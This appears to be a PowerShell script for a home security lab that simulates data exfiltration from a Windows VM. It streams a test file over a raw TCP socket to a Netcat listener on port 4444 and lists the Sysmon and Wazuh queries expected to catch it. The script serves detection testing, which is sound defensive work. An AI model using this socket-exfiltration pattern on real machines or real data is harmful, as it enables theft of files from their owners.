# Attack 3: Data Exfiltration Detection Simulation (Windows VM)
Write-Host "Simulating Data Exfiltration..."
# Send test file to Arch Linux Netcat listener
$serverIp = "192.168.1.55"  # Replace with Arch Linux VM IP, e.g., 192.168.1.100
$port = 4444
$filePath = "C:\Users\Public\exfil_test.txt"
$client = New-Object System.Net.Sockets.TcpClient($serverIp, $port)
$stream = $client.GetStream()
$fileContent = Get-Content -Path $filePath -Raw
$writer = New-Object System.IO.StreamWriter($stream)
$writer.Write($fileContent)
$writer.Flush()
$writer.Close()
$stream.Close()
$client.Close()
Write-Host "Data Exfiltration Simulation Complete"
# Expected: Sysmon Event ID 3 (powershell.exe, port 4444)
# Wazuh: Search "win.eventdata.destinationPort:4444" or "win.eventdata.image:powershell.exe"